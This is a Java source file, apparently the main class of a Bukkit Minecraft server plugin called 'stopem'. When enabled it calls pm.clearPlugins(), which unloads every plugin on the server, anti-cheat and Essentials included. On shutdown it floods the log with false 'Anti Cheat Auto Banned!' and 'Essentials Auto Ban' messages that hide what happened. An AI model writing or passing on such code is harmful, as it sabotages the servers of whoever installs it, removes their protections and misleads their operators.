//Copyright © Zachary Walensa 2017


package me.stopem;



import java.util.List;

import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.event.Listener;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener {


 private static Main plugin;
 public static boolean started;


 static Main instance;

 public Main() {
  instance = this;
 }

 public static Main instance() {
  return instance;
 }

 Server server = getServer();
 PluginManager pm = server.getPluginManager();
 public void onEnable() {
  plugin = this;
started = true;

  getLogger().info("|----------------------------------------|");

  
  pm.registerEvents(this, this);
  pm.registerEvents(new Stopem(this), this);
  //pm.registerEvents(new InventoryClick(this), this);
  //pm.registerEvents(new Fight(this), this);
  //pm.registerEvents(new Abilities(this), this);
  //pm.registerEvents(new PlayerLogin(this), this);

	
//getCommand("Stopem").setExecutor(new Stopem (this)); 
//getCommand("Choose").setExecutor(new Choose (this)); 
//getCommand("clearchat").setExecutor(new CommandClearChat(this));
  pm.clearPlugins();
  saveDefaultConfig();
 }

 public void onDisable() {

  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("Anti Cheat Auto Banned!");
  getLogger().info("=======================");
  getLogger().info("=======================");
  getLogger().info("=======================");
  getLogger().info("=======================");
  getLogger().info("=======================");
  getLogger().info("=======================");

  getLogger().info("Essentials Auto Ban");
  getLogger().info("Essentials Auto Ban");
  getLogger().info("Essentials Auto Ban");
  getLogger().info("Essentials Auto Ban");
  getLogger().info("Essentials Auto Ban");
  getLogger().info("Essentials Auto Ban");
  

  }

 public static Main getInstance() {
  return plugin;
 }
}